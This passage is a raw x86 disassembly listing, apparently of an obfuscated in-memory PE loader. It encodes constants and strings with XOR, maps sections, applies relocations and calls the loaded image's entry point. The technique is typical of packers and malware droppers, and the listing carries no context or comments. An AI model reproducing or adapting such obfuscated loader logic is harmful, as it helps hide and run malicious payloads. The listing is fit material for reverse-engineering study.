  426e3b:	cmp    ecx,eax
  426e3d:	jne    0x426e51
  426e3f:	mov    eax,DWORD PTR [ebp+0x10]
  426e42:	push   DWORD PTR [ebp+0xc]
  426e45:	mov    eax,DWORD PTR [eax+0x1e0]
  426e4b:	call   DWORD PTR [eax+0xc]
  426e4e:	mov    DWORD PTR [ebp-0xc],eax
  426e51:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426e58:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426e5f:	mov    eax,DWORD PTR [ebp-0x4]
  426e62:	xor    eax,esi
  426e64:	add    eax,edi
  426e66:	cmp    eax,DWORD PTR [ebp-0xc]
  426e69:	jne    0x426e8e
  426e6b:	mov    eax,DWORD PTR [ebp-0x8]
  426e6e:	mov    ecx,DWORD PTR [ebp-0x20]
  426e71:	xor    eax,esi
  426e73:	xor    ecx,esi
  426e75:	lea    ebx,[ebx+eax*1+0x3272f1]
  426e7c:	mov    eax,DWORD PTR [ebp+0x10]
  426e7f:	mov    eax,DWORD PTR [eax+0x1e0]
  426e85:	add    ecx,edi
  426e87:	imul   ecx,ebx
  426e8a:	push   ecx
  426e8b:	call   DWORD PTR [eax+0x24]
  426e8e:	mov    eax,DWORD PTR [ebp-0x4]
  426e91:	xor    eax,esi
  426e93:	add    eax,edi
  426e95:	cmp    eax,DWORD PTR [ebp-0xc]
  426e98:	jne    0x426ea9
  426e9a:	mov    eax,DWORD PTR [ebp-0x28]
  426e9d:	xor    eax,esi
  426e9f:	add    eax,edi
  426ea1:	cmp    ebx,eax
  426ea3:	jbe    0x426e23
  426ea9:	mov    eax,DWORD PTR [ebp-0x4]
  426eac:	xor    eax,esi
  426eae:	add    eax,edi
  426eb0:	cmp    eax,DWORD PTR [ebp-0xc]
  426eb3:	jne    0x426ecc
  426eb5:	mov    eax,DWORD PTR [ebp-0x8]
  426eb8:	mov    ecx,DWORD PTR [ebp-0x18]
  426ebb:	xor    eax,esi
  426ebd:	lea    eax,[ecx+eax*1+0x3272f1]
  426ec4:	mov    DWORD PTR [ebp-0x18],eax
  426ec7:	jmp    0x426fbb
  426ecc:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  426ed3:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  426eda:	mov    ebx,DWORD PTR [ebp-0x4]
  426edd:	xor    ebx,esi
  426edf:	add    ebx,edi
  426ee1:	jmp    0x426fa8
  426ee6:	mov    eax,DWORD PTR [ebp-0x4]
  426ee9:	xor    eax,esi
  426eeb:	add    eax,edi
  426eed:	mov    DWORD PTR [ebp-0x14],eax
  426ef0:	mov    eax,DWORD PTR [ebp-0x4]
  426ef3:	xor    eax,esi
  426ef5:	add    eax,edi
  426ef7:	mov    DWORD PTR [ebp+0xc],eax
  426efa:	mov    ecx,DWORD PTR [ebp-0x4]
  426efd:	mov    eax,DWORD PTR [ebp-0x24]
  426f00:	xor    ecx,esi
  426f02:	add    ecx,edi
  426f04:	cmp    ecx,eax
  426f06:	je     0x426f0e
  426f08:	mov    eax,DWORD PTR [eax+ebx*4]
  426f0b:	mov    DWORD PTR [ebp-0x14],eax
  426f0e:	mov    eax,DWORD PTR [ebp-0x1c]
  426f11:	mov    eax,DWORD PTR [eax+ebx*4]
  426f14:	mov    DWORD PTR [ebp+0xc],eax
  426f17:	mov    eax,DWORD PTR [ebp-0x4]
  426f1a:	mov    ecx,DWORD PTR [ebp-0x14]
  426f1d:	xor    eax,esi
  426f1f:	add    eax,edi
  426f21:	cmp    eax,ecx
  426f23:	je     0x426f4e
  426f25:	mov    eax,DWORD PTR [ebp-0x4]
  426f28:	mov    ecx,DWORD PTR [ebp-0x14]
  426f2b:	xor    eax,esi
  426f2d:	add    eax,edi
  426f2f:	shr    ecx,0x1f
  426f32:	cmp    eax,ecx
  426f34:	je     0x426f4e
  426f36:	mov    ecx,DWORD PTR [ebp-0x14]
  426f39:	mov    eax,DWORD PTR [ebp+0x10]
  426f3c:	mov    eax,DWORD PTR [eax+0x1e0]
  426f42:	movzx  ecx,cx
  426f45:	push   ecx
  426f46:	push   DWORD PTR [ebp-0xc]
  426f49:	call   DWORD PTR [eax+0x8]
  426f4c:	jmp    0x426f67
  426f4e:	mov    eax,DWORD PTR [ebp+0xc]
  426f51:	add    eax,DWORD PTR [ebp+0x8]
  426f54:	mov    ecx,DWORD PTR [ebp+0x10]
  426f57:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426f5d:	add    eax,0x2
  426f60:	push   eax
  426f61:	push   DWORD PTR [ebp-0xc]
  426f64:	call   DWORD PTR [ecx+0x8]
  426f67:	mov    DWORD PTR [ebp+0xc],eax
  426f6a:	mov    eax,DWORD PTR [ebp-0x4]
  426f6d:	mov    ecx,DWORD PTR [ebp+0xc]
  426f70:	xor    eax,esi
  426f72:	add    eax,edi
  426f74:	cmp    eax,ecx
  426f76:	mov    eax,DWORD PTR [ebp-0x8]
  426f79:	jne    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebp-0x18]
  426f7e:	xor    eax,esi
  426f80:	lea    eax,[ecx+eax*1+0x3272f1]
  426f87:	mov    DWORD PTR [ebp-0x18],eax
  426f8a:	jmp    0x426f9c
  426f8c:	mov    ecx,DWORD PTR [ebp+0xc]
  426f8f:	xor    eax,esi
  426f91:	add    eax,edi
  426f93:	imul   eax,ecx
  426f96:	mov    ecx,DWORD PTR [ebp-0x1c]
  426f99:	mov    DWORD PTR [ecx+ebx*4],eax
  426f9c:	mov    eax,DWORD PTR [ebp-0x8]
  426f9f:	xor    eax,esi
  426fa1:	lea    ebx,[ebx+eax*1+0x3272f1]
  426fa8:	mov    eax,DWORD PTR [ebp-0x4]
  426fab:	mov    ecx,DWORD PTR [ebp-0x1c]
  426fae:	xor    eax,esi
  426fb0:	add    eax,edi
  426fb2:	cmp    DWORD PTR [ecx+ebx*4],eax
  426fb5:	jne    0x426ee6
  426fbb:	mov    edx,DWORD PTR [ebp-0x10]
  426fbe:	mov    ecx,DWORD PTR [ebp-0x2c]
  426fc1:	mov    eax,DWORD PTR [ebp-0x18]
  426fc4:	sub    edx,0x3272f0
  426fca:	xor    edx,esi
  426fcc:	jmp    0x426d96
  426fd1:	mov    ecx,DWORD PTR [ebp-0x4]
  426fd4:	xor    ecx,esi
  426fd6:	add    ecx,edi
  426fd8:	cmp    eax,ecx
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	jne    0x426fe7
  426fdf:	mov    eax,DWORD PTR [ebp-0x8]
  426fe2:	jmp    0x426fe7
  426fe4:	mov    eax,DWORD PTR [ebp-0x4]
  426fe7:	xor    eax,esi
  426fe9:	add    eax,edi
  426feb:	pop    edi
  426fec:	pop    esi
  426fed:	pop    ebx
  426fee:	leave  
  426fef:	ret    0xc
  426ff2:	push   ebp
  426ff3:	mov    ebp,esp
  426ff5:	sub    esp,0x28
  426ff8:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426fff:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427006:	mov    eax,DWORD PTR [ebp+0xc]
  427009:	mov    DWORD PTR [ebp+0xc],eax
  42700c:	push   esi
  42700d:	mov    eax,eax
  42700f:	mov    eax,DWORD PTR [ebp-0x4]
  427012:	mov    esi,DWORD PTR [ebp+0x8]
  427015:	mov    ecx,0x75108aa
  42701a:	xor    eax,ecx
  42701c:	mov    edx,0x3272f1
  427021:	add    eax,edx
  427023:	cmp    esi,eax
  427025:	je     0x42714c
  42702b:	mov    eax,DWORD PTR [ebp+0x8]
  42702e:	mov    esi,DWORD PTR [ebp+0x8]
  427031:	add    esi,DWORD PTR [eax+0x3c]
  427034:	push   edi
  427035:	mov    DWORD PTR [ebp+0xc],esi
  427038:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42703f:	mov    eax,DWORD PTR [ebp-0x1c]
  427042:	mov    esi,DWORD PTR [ebp-0x4]
  427045:	mov    edi,DWORD PTR [ebp+0xc]
  427048:	xor    esi,ecx
  42704a:	xor    eax,ecx
  42704c:	add    esi,edx
  42704e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427055:	je     0x427146
  42705b:	mov    esi,DWORD PTR [ebp+0xc]
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	add    eax,DWORD PTR [esi+0xa0]
  427067:	mov    esi,DWORD PTR [ebp+0x8]
  42706a:	mov    edi,DWORD PTR [ebp+0xc]
  42706d:	sub    esi,DWORD PTR [edi+0x34]
  427070:	mov    edi,DWORD PTR [ebp-0x4]
  427073:	xor    edi,ecx
  427075:	add    edi,edx
  427077:	mov    DWORD PTR [ebp-0x24],esi
  42707a:	cmp    esi,edi
  42707c:	je     0x427146
  427082:	mov    esi,DWORD PTR [ebp-0x4]
  427085:	xor    esi,ecx
  427087:	add    esi,edx
  427089:	mov    DWORD PTR [ebp-0x8],esi
  42708c:	push   ebx
  42708d:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  427094:	jmp    0x427130
  427099:	mov    esi,DWORD PTR [ebp-0x4]
  42709c:	xor    esi,ecx
  42709e:	lea    edi,[ebx-0x8]
  4270a1:	add    esi,edx
  4270a3:	shr    edi,1
  4270a5:	cmp    esi,edi
  4270a7:	jae    0x427116
  4270a9:	sub    edi,esi
  4270ab:	lea    ebx,[eax+esi*2+0x8]
  4270af:	mov    DWORD PTR [ebp-0x18],edi
  4270b2:	movzx  esi,WORD PTR [ebx]
  4270b5:	and    esi,0xfff
  4270bb:	mov    DWORD PTR [ebp-0x14],esi
  4270be:	mov    edi,DWORD PTR [ebp-0x14]
  4270c1:	mov    esi,DWORD PTR [eax]
  4270c3:	sub    esi,edx
  4270c5:	add    edi,esi
  4270c7:	movzx  esi,WORD PTR [ebx]
  4270ca:	shr    esi,0xc
  4270cd:	xor    edi,ecx
  4270cf:	mov    DWORD PTR [ebp-0x20],edi
  4270d2:	mov    DWORD PTR [ebp-0x14],esi
  4270d5:	mov    esi,DWORD PTR [ebp-0x20]
  4270d8:	mov    edi,DWORD PTR [ebp+0x8]
  4270db:	xor    esi,ecx
  4270dd:	lea    esi,[esi+edi*1+0x3272f1]
  4270e4:	mov    DWORD PTR [ebp-0x20],esi
  4270e7:	mov    esi,DWORD PTR [ebp-0x10]
  4270ea:	mov    edi,DWORD PTR [ebp-0x14]
  4270ed:	xor    esi,ecx
  4270ef:	add    esi,edx
  4270f1:	cmp    edi,esi
  4270f3:	jne    0x42710b
  4270f5:	mov    esi,DWORD PTR [ebp-0x10]
  4270f8:	mov    edi,DWORD PTR [ebp-0x14]
  4270fb:	xor    esi,ecx
  4270fd:	add    esi,edx
  4270ff:	cmp    edi,esi
  427101:	jne    0x42710b
  427103:	mov    esi,DWORD PTR [ebp-0x20]
  427106:	mov    edi,DWORD PTR [ebp-0x24]
  427109:	add    DWORD PTR [esi],edi
  42710b:	add    ebx,0x2
  42710e:	dec    DWORD PTR [ebp-0x18]
  427111:	jne    0x4270b2
  427113:	mov    ebx,DWORD PTR [ebp-0xc]
  427116:	add    DWORD PTR [ebp-0x8],ebx
  427119:	mov    esi,DWORD PTR [ebp-0x1c]
  42711c:	mov    edi,DWORD PTR [ebp-0x8]
  42711f:	mov    ebx,DWORD PTR [ebp+0xc]
  427122:	xor    esi,ecx
  427124:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42712b:	jae    0x427145
  42712d:	add    eax,DWORD PTR [ebp-0xc]
  427130:	mov    esi,DWORD PTR [ebp-0x4]
  427133:	mov    ebx,DWORD PTR [eax+0x4]
  427136:	xor    esi,ecx
  427138:	add    esi,edx
  42713a:	mov    DWORD PTR [ebp-0xc],ebx
  42713d:	cmp    ebx,esi
  42713f:	jne    0x427099
  427145:	pop    ebx
  427146:	mov    eax,DWORD PTR [ebp-0x28]
  427149:	pop    edi
  42714a:	jmp    0x42714f
  42714c:	mov    eax,DWORD PTR [ebp-0x4]
  42714f:	xor    eax,ecx
  427151:	add    eax,edx
  427153:	pop    esi
  427154:	leave  
  427155:	ret    0x8
  427158:	push   ebp
  427159:	mov    ebp,esp
  42715b:	sub    esp,0xd8
  427161:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427168:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  42716f:	mov    eax,DWORD PTR [ebp-0x4]
  427172:	push   ebx
  427173:	push   esi
  427174:	mov    esi,0x75108aa
  427179:	xor    eax,esi
  42717b:	push   edi
  42717c:	mov    edi,0x3272f1
  427181:	add    eax,edi
  427183:	mov    DWORD PTR [ebp-0x18],eax
  427186:	mov    eax,DWORD PTR [ebp-0x4]
  427189:	xor    eax,esi
  42718b:	add    eax,edi
  42718d:	mov    DWORD PTR [ebp-0x8],eax
  427190:	mov    ebx,DWORD PTR [ebp+0x20]
  427193:	mov    eax,DWORD PTR [ebp-0x1c]
  427196:	mov    ecx,DWORD PTR [ebp-0x1c]
  427199:	xor    eax,ecx
  42719b:	mov    DWORD PTR [ebp-0x1c],eax
  42719e:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4271a5:	mov    eax,DWORD PTR [ebp-0xc]
  4271a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ab:	xor    eax,ecx
  4271ad:	mov    DWORD PTR [ebp-0xc],eax
  4271b0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4271b7:	mov    eax,DWORD PTR [ebp-0x10]
  4271ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4271bd:	xor    eax,ecx
  4271bf:	mov    DWORD PTR [ebp-0x10],eax
  4271c2:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4271c9:	mov    eax,DWORD PTR [ebp-0x28]
  4271cc:	mov    ecx,DWORD PTR [ebp-0x28]
  4271cf:	xor    eax,ecx
  4271d1:	mov    DWORD PTR [ebp-0x28],eax
  4271d4:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4271db:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4271e2:	mov    eax,DWORD PTR [ebp+0x8]
  4271e5:	test   eax,eax
  4271e7:	je     0x427670
  4271ed:	mov    eax,DWORD PTR [ebp+0xc]
  4271f0:	test   eax,eax
  4271f2:	je     0x427670
  4271f8:	mov    eax,DWORD PTR [ebp+0x18]
  4271fb:	test   eax,eax
  4271fd:	je     0x427670
  427203:	mov    eax,DWORD PTR [ebp+0x20]
  427206:	mov    ecx,DWORD PTR [ebp+0x8]
  427209:	xor    eax,0x8aa
  42720e:	add    eax,0x72f1
  427213:	cmp    WORD PTR [ecx],ax
  427216:	jne    0x427670
  42721c:	mov    eax,DWORD PTR [ebp-0x4]
  42721f:	xor    eax,esi
  427221:	add    eax,edi
  427223:	mov    DWORD PTR [ebp-0x30],eax
  427226:	mov    eax,DWORD PTR [ebp-0x4]
  427229:	mov    ecx,DWORD PTR [ebp+0x8]
  42722c:	mov    eax,DWORD PTR [ebp+0x8]
  42722f:	add    eax,DWORD PTR [ecx+0x3c]
  427232:	mov    DWORD PTR [ebp+0xc],eax
  427235:	mov    eax,DWORD PTR [eax+0x50]
  427238:	test   eax,eax
  42723a:	je     0x427670
  427240:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427247:	mov    eax,DWORD PTR [ebp-0x2c]
  42724a:	xor    eax,esi
  42724c:	add    eax,edi
  42724e:	mov    DWORD PTR [ebp-0x2c],eax
  427251:	mov    eax,DWORD PTR [ebp-0x4]
  427254:	mov    eax,DWORD PTR [ebx+0x190]
  42725a:	mov    ecx,DWORD PTR [eax]
  42725c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42725f:	add    ecx,DWORD PTR [eax]
  427261:	mov    eax,DWORD PTR [ebp-0x4]
  427264:	mov    eax,DWORD PTR [ebx+0x18c]
  42726a:	mov    edx,DWORD PTR [eax]
  42726c:	mov    DWORD PTR [ebp-0x20],ecx
  42726f:	mov    DWORD PTR [ebp+0x20],edx
  427272:	cmp    edx,edx
  427274:	jne    0x4272a8
  427276:	mov    eax,DWORD PTR [ebx+0x1e0]
  42727c:	lea    edx,[ebp-0x18]
  42727f:	push   edx
  427280:	mov    edx,DWORD PTR [ebp-0xc]
  427283:	xor    edx,esi
  427285:	add    edx,edi
  427287:	push   edx
  427288:	push   DWORD PTR [ecx+0x50]
  42728b:	push   DWORD PTR [ebp+0x20]
  42728e:	call   DWORD PTR [eax+0x1c]
  427291:	mov    eax,DWORD PTR [ebp-0x20]
  427294:	mov    ecx,DWORD PTR [eax+0x54]
  427297:	mov    eax,DWORD PTR [eax+0x50]
  42729a:	sub    eax,ecx
  42729c:	add    ecx,DWORD PTR [ebp+0x20]
  42729f:	push   ecx
  4272a0:	call   0x427c0b
  4272a5:	mov    edx,DWORD PTR [ebp+0x20]
  4272a8:	mov    eax,DWORD PTR [ebx+0x194]
  4272ae:	mov    DWORD PTR [eax],edx
  4272b0:	mov    eax,DWORD PTR [ebp+0xc]
  4272b3:	push   DWORD PTR [eax+0x54]
  4272b6:	push   DWORD PTR [ebp+0x8]
  4272b9:	push   edx
  4272ba:	call   0x427b01
  4272bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4272c2:	mov    eax,DWORD PTR [ecx+0x3c]
  4272c5:	add    eax,ecx
  4272c7:	movzx  ecx,WORD PTR [eax+0x14]
  4272cb:	lea    ecx,[ecx+eax*1+0x18]
  4272cf:	mov    DWORD PTR [ebp+0x18],ecx
  4272d2:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d5:	movzx  edx,WORD PTR [eax+0x6]
  4272d9:	xor    ecx,esi
  4272db:	add    ecx,edi
  4272dd:	mov    DWORD PTR [ebp+0xc],eax
  4272e0:	cmp    edx,ecx
  4272e2:	je     0x42738f
  4272e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4272eb:	xor    ecx,esi
  4272ed:	add    ecx,edi
  4272ef:	mov    DWORD PTR [ebp-0x8],ecx
  4272f2:	mov    ecx,DWORD PTR [ebp-0x24]
  4272f5:	movzx  edx,WORD PTR [eax+0x6]
  4272f9:	xor    ecx,esi
  4272fb:	sub    edx,ecx
  4272fd:	sub    edx,edi
  4272ff:	cmp    DWORD PTR [ebp-0x8],edx
  427302:	ja     0x42738f
  427308:	mov    edx,DWORD PTR [ebp+0x18]
  42730b:	add    edx,0x8
  42730e:	mov    DWORD PTR [ebp+0x18],edx
  427311:	jmp    0x427316
  427313:	mov    edx,DWORD PTR [ebp+0x18]
  427316:	mov    eax,DWORD PTR [eax+0x38]
  427319:	lea    ecx,[eax-0x1]
  42731c:	mov    DWORD PTR [ebp-0x38],eax
  42731f:	mov    eax,DWORD PTR [edx]
  427321:	test   eax,ecx
  427323:	je     0x42732c
  427325:	not    ecx
  427327:	and    eax,ecx
  427329:	add    eax,DWORD PTR [ebp-0x38]
  42732c:	mov    ecx,DWORD PTR [edx+0x4]
  42732f:	add    ecx,DWORD PTR [ebp+0x20]
  427332:	push   ecx
  427333:	call   0x427c0b
  427338:	mov    edx,DWORD PTR [ebp-0x4]
  42733b:	mov    eax,DWORD PTR [ebp+0x18]
  42733e:	mov    ecx,DWORD PTR [eax+0x8]
  427341:	xor    edx,esi
  427343:	add    edx,edi
  427345:	cmp    ecx,edx
  427347:	je     0x427360
  427349:	push   ecx
  42734a:	mov    ecx,DWORD PTR [ebp+0x8]
  42734d:	add    ecx,DWORD PTR [eax+0xc]
  427350:	mov    eax,DWORD PTR [eax+0x4]
  427353:	add    eax,DWORD PTR [ebp+0x20]
  427356:	push   ecx
  427357:	push   eax
  427358:	call   0x427b01
  42735d:	mov    eax,DWORD PTR [ebp+0x18]
  427360:	mov    ecx,DWORD PTR [ebp-0x24]
  427363:	mov    edx,DWORD PTR [ebp-0x8]
  427366:	add    eax,0x28
  427369:	xor    ecx,esi
  42736b:	lea    ecx,[edx+ecx*1+0x3272f1]
  427372:	mov    edx,DWORD PTR [ebp+0xc]
  427375:	mov    DWORD PTR [ebp+0x18],eax
  427378:	mov    eax,DWORD PTR [ebp-0x24]
  42737b:	movzx  edx,WORD PTR [edx+0x6]
  42737f:	xor    eax,esi
  427381:	sub    edx,eax
  427383:	mov    eax,DWORD PTR [ebp+0xc]
  427386:	sub    edx,edi
  427388:	mov    DWORD PTR [ebp-0x8],ecx
  42738b:	cmp    ecx,edx
  42738d:	jbe    0x427313
  42738f:	mov    edx,DWORD PTR [ebx+0x18c]
  427395:	mov    ecx,DWORD PTR [ebp+0x20]
  427398:	cmp    ecx,DWORD PTR [edx]
  42739a:	jne    0x4273c3
  42739c:	mov    eax,DWORD PTR [ebx+0x1e0]
  4273a2:	lea    edx,[ebp-0x18]
  4273a5:	push   edx
  4273a6:	mov    edx,DWORD PTR [ebp-0x10]
  4273a9:	xor    edx,esi
  4273ab:	add    edx,edi
  4273ad:	push   edx
  4273ae:	mov    edx,DWORD PTR [ebp-0x20]
  4273b1:	push   DWORD PTR [edx+0x54]
  4273b4:	push   ecx
  4273b5:	call   DWORD PTR [eax+0x1c]
  4273b8:	test   eax,eax
  4273ba:	je     0x427661
  4273c0:	mov    eax,DWORD PTR [ebp+0xc]
  4273c3:	mov    ecx,DWORD PTR [ebx+0x1c8]
  4273c9:	mov    ecx,DWORD PTR [ecx]
  4273cb:	xor    ecx,esi
  4273cd:	add    ecx,edi
  4273cf:	je     0x42758c
  4273d5:	mov    eax,DWORD PTR [ebp-0x4]
  4273d8:	xor    eax,esi
  4273da:	add    eax,edi
  4273dc:	and    DWORD PTR [ebp+0x8],0x0
  4273e0:	mov    DWORD PTR [ebp-0x14],eax
  4273e3:	mov    eax,0xf89c85d9
  4273e8:	lea    ecx,[eax-0x8]
  4273eb:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4273f2:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  4273f9:	mov    DWORD PTR [ebp-0x50],eax
  4273fc:	mov    DWORD PTR [ebp-0x4c],ecx
  4273ff:	mov    DWORD PTR [ebp-0x48],ecx
  427402:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427409:	mov    edx,DWORD PTR [ebp+0x8]
  42740c:	mov    ecx,0x8aa
  427411:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427416:	mov    edx,0x72f1
  42741b:	add    cx,dx
  42741e:	mov    edx,DWORD PTR [ebp+0x8]
  427421:	inc    DWORD PTR [ebp+0x8]
  427424:	cmp    DWORD PTR [ebp+0x8],0x6
  427428:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427430:	jb     0x427409
  427432:	mov    ecx,0xf89c852b
  427437:	mov    DWORD PTR [ebp-0xb0],eax
  42743d:	mov    DWORD PTR [ebp-0x9c],eax
  427443:	mov    DWORD PTR [ebp-0x74],eax
  427446:	mov    DWORD PTR [ebp-0x70],eax
  427449:	lea    eax,[ecx-0x3]
  42744c:	mov    edx,0xf89c85ff
  427451:	mov    DWORD PTR [ebp-0x64],eax
  427454:	mov    DWORD PTR [ebp-0x60],eax
  427457:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  427461:	mov    DWORD PTR [ebp-0xac],ecx
  427467:	mov    DWORD PTR [ebp-0xa8],edx
  42746d:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427477:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427481:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  42748b:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427495:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  42749f:	mov    DWORD PTR [ebp-0x8c],ecx
  4274a5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4274af:	mov    DWORD PTR [ebp-0x84],edx
  4274b5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4274bc:	mov    DWORD PTR [ebp-0x7c],ecx
  4274bf:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  4274c6:	mov    DWORD PTR [ebp-0x6c],ecx
  4274c9:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  4274d0:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  4274d7:	xor    eax,eax
  4274d9:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4274e0:	xor    cl,0xaa
  4274e3:	sub    cl,0xf
  4274e6:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4274ed:	inc    eax
  4274ee:	cmp    eax,0x17
  4274f1:	jb     0x4274d9
  4274f3:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274f9:	lea    ecx,[ebp-0xc0]
  4274ff:	push   ecx
  427500:	call   DWORD PTR [eax+0x4]
  427503:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427509:	lea    edx,[ebp-0xd8]
  42750f:	push   edx
  427510:	push   eax
  427511:	call   DWORD PTR [ecx+0x8]
  427514:	mov    DWORD PTR [ebp-0x40],eax
  427517:	lea    eax,[ebp-0x14]
  42751a:	push   eax
  42751b:	mov    eax,DWORD PTR [ebx+0x18c]
  427521:	push   DWORD PTR [eax]
  427523:	mov    eax,DWORD PTR [ebp-0x40]
  427526:	call   eax
  427528:	mov    eax,DWORD PTR [ebp-0x4]
  42752b:	xor    eax,esi
  42752d:	add    eax,edi
  42752f:	mov    DWORD PTR [ebp-0x34],eax
  427532:	mov    ecx,DWORD PTR [ebp-0x4]
  427535:	mov    eax,DWORD PTR [ebp-0x14]
  427538:	xor    ecx,esi
  42753a:	add    ecx,edi
  42753c:	cmp    eax,ecx
  42753e:	je     0x427589
  427540:	mov    DWORD PTR [ebp-0x3c],eax
  427543:	jmp    0x427554
  427545:	mov    eax,DWORD PTR [eax]
  427547:	mov    ecx,DWORD PTR [ebp-0x3c]
  42754a:	mov    DWORD PTR [ebp-0x14],eax
  42754d:	mov    eax,DWORD PTR [ebp-0x14]
  427550:	cmp    eax,ecx
  427552:	je     0x427561
  427554:	mov    edx,DWORD PTR [eax+0x18]
  427557:	mov    ecx,DWORD PTR [ebx+0x18c]
  42755d:	cmp    edx,DWORD PTR [ecx]
  42755f:	jne    0x427545
  427561:	mov    ecx,DWORD PTR [ebx+0x18c]
  427567:	mov    edx,DWORD PTR [eax+0x18]
  42756a:	cmp    edx,DWORD PTR [ecx]
  42756c:	jne    0x427589
  42756e:	mov    ecx,DWORD PTR [ebx+0x190]
  427574:	mov    edx,DWORD PTR [ebp-0x20]
  427577:	mov    edx,DWORD PTR [edx+0x28]
  42757a:	add    edx,DWORD PTR [ecx]
  42757c:	mov    DWORD PTR [eax+0x1c],edx
  42757f:	mov    eax,DWORD PTR [ebp-0x24]
  427582:	xor    eax,esi
  427584:	add    eax,edi
  427586:	mov    DWORD PTR [ebp-0x34],eax
  427589:	mov    eax,DWORD PTR [ebp+0xc]
  42758c:	push   ebx
  42758d:	push   eax
  42758e:	push   DWORD PTR [ebp+0x20]
  427591:	call   0x426d0f
  427596:	test   eax,eax
  427598:	je     0x427661
  42759e:	push   DWORD PTR [ebp+0xc]
  4275a1:	mov    ecx,ebx
  4275a3:	push   DWORD PTR [ebp+0x20]
  4275a6:	call   0x426c68
  4275ab:	test   eax,eax
  4275ad:	je     0x427661
  4275b3:	mov    eax,DWORD PTR [ebp+0xc]
  4275b6:	mov    edx,DWORD PTR [ebp+0x20]
  4275b9:	mov    ecx,ebx
  4275bb:	call   0x426b41
  4275c0:	test   eax,eax
  4275c2:	je     0x427661
  4275c8:	push   ebx
  4275c9:	push   DWORD PTR [ebp+0x20]
  4275cc:	call   0x426ff2
  4275d1:	test   eax,eax
  4275d3:	je     0x427661
  4275d9:	mov    eax,DWORD PTR [ebx+0x18c]
  4275df:	mov    edx,DWORD PTR [ebp+0x20]
  4275e2:	cmp    edx,DWORD PTR [eax]
  4275e4:	jne    0x427600
  4275e6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4275ec:	lea    ecx,[ebp-0x18]
  4275ef:	push   ecx
  4275f0:	push   DWORD PTR [ebp-0x18]
  4275f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4275f6:	push   DWORD PTR [ecx+0x54]
  4275f9:	push   edx
  4275fa:	call   DWORD PTR [eax+0x1c]
  4275fd:	mov    edx,DWORD PTR [ebp+0x20]
  427600:	mov    eax,DWORD PTR [ebx+0x1c8]
  427606:	mov    eax,DWORD PTR [eax]
  427608:	xor    eax,esi
  42760a:	add    eax,edi
  42760c:	je     0x427645
  42760e:	mov    ecx,DWORD PTR [ebp+0xc]
  427611:	mov    eax,DWORD PTR [ecx+0x28]
  427614:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42761b:	mov    esi,DWORD PTR [ebp+0x8]
  42761e:	push   DWORD PTR [ebp+0x14]
  427621:	xor    esi,0x8aa
  427627:	push   DWORD PTR [ebp+0x10]
  42762a:	add    esi,0x72f1
  427630:	or     WORD PTR [ecx+0x16],si
  427634:	add    eax,edx
  427636:	push   edx
  427637:	call   eax
  427639:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427643:	jmp    0x42764f
  427645:	mov    eax,DWORD PTR [ebp+0xc]
  427648:	mov    eax,DWORD PTR [eax+0x28]
  42764b:	add    eax,edx
  42764d:	call   eax
  42764f:	mov    DWORD PTR [ebp-0x8],eax
  427652:	mov    eax,DWORD PTR [ebp-0x8]
  427655:	mov    ecx,DWORD PTR [ebp+0x1c]
  427658:	mov    DWORD PTR [ecx],eax
  42765a:	mov    DWORD PTR [ebp-0x30],0x1
  427661:	cmp    DWORD PTR [ebp-0x30],0x0
  427665:	jne    0x42766b
  427667:	and    DWORD PTR [ebp+0x20],0x0
  42766b:	mov    eax,DWORD PTR [ebp+0x20]
  42766e:	jmp    0x427672
  427670:	xor    eax,eax
  427672:	pop    edi
  427673:	pop    esi
  427674:	pop    ebx
  427675:	leave  
  427676:	ret    0x1c
  427679:	push   ebp
  42767a:	mov    ebp,esp
  42767c:	movzx  edx,WORD PTR [ecx+0x6]
